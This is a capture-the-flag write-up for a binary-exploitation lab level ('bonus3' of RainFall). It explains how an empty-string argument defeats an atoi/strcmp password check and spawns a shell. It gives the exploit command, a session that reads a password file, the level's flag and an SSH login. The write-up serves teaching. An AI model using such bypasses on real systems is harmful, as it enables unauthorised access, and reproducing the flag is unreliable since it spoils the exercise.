# Bonus3 - The Empty String Bypass

![Helldivers](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

## 📋 Binary Analysis

```c
int main(int argc, char **argv)
{
	char buffer[66];
	char message[66];
	FILE *file;
	int index;

	file = fopen("/home/user/end/.pass", "r");
	memset(buffer, 0, 66);

	if (file == NULL || argc != 2)
		return (-1);

	fread(buffer, 1, 66, file);
	buffer[atoi(argv[1])] = '\0';  // ← Vulnerability: unchecked array index
	
	fread(message, 1, 65, file);
	fclose(file);

	if (strcmp(buffer, argv[1]) == 0)  // ← Check: buffer equals argv[1]?
		execl("/bin/sh", "sh", NULL);  // ← Victory: spawn shell!
	else
		puts(message);                 // ← Failure: print message

	return (0);
}
```

## 🚨 Vulnerability

**Logic bypass via empty string argument**

The program reads the password file, then performs a flawed validation:
1. Uses `atoi(argv[1])` as an array index to place a null byte
2. Compares the modified buffer with `argv[1]` using `strcmp()`
3. Spawns shell if they match

**Critical flaw:**
- `atoi("")` returns 0 (empty string → zero)
- `buffer[0] = '\0'` makes buffer an empty string
- `strcmp("", "")` returns 0 (match!)
- Shell spawned without knowing the password

This is the **simplest exploit in RainFall** - just provide an empty string.

## 🎯 How the Exploit Works

### Understanding atoi() Behavior

The `atoi()` function has specific edge cases that enable this exploit:

| Input | atoi() Result | Explanation |
|-------|---------------|-------------|
| `"123"` | 123 | Normal numeric conversion |
| `"0"` | 0 | Zero is valid |
| `""` | 0 | **Empty string returns 0** ← Key! |
| `"abc"` | 0 | Non-numeric returns 0 |
| `"-5"` | -5 | Negative numbers accepted |
| `"42xyz"` | 42 | Stops at first non-digit |

**Key insight:** Both `""` and `"abc"` return 0 from atoi(), but `strcmp()` treats them differently!

### Exploit Execution Flow

```
1. Program receives argv[1] = ""
2. Opens /home/user/end/.pass and reads 66 bytes into buffer
3. Executes: buffer[atoi("")] = '\0'
   → atoi("") = 0
   → buffer[0] = '\0'
   → buffer is now an empty string
4. Executes: strcmp(buffer, argv[1])
   → strcmp("", "")
   → Returns 0 (strings match!)
5. Condition (0 == 0) is true
6. execl("/bin/sh") spawns shell as end user ✓
```

### Key Insight

The RainFall journey comes full circle: starting with simple logic checks (level0) and ending with the simplest bypass of all (empty input). After mastering buffer overflows, format strings, heap exploitation, and advanced techniques, the final challenge reminds us: **Sometimes the simplest input breaks the most assumptions.**

The developer assumed users would provide meaningful input, never testing the edge case of nothing at all.

## 💣 Execute the Exploit

```bash
# Simply provide an empty string as the argument
./bonus3 ""
```

**Expected output:**
```bash
$ ← Shell prompt (you have shell as end user!)
```

**Complete exploitation sequence:**
```bash
# Execute the exploit
./bonus3 ""

# Verify access
$ whoami
end

# Read the final password
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c

# Exit shell
$ exit

# Login as end user
ssh end@localhost -p 2222
Password: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

> 💡 **Pro Tip**: Always test edge cases like empty strings, null pointers, zero values, and negative numbers when fuzzing applications!

> ⚠️ **Security Note**: Modern secure coding practices require [input validation](https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs) to reject empty or malformed inputs before processing. Functions like `atoi()` should be replaced with safer alternatives like `strtol()` that provide error checking!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**RainFall Complete!** 🎊

```
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
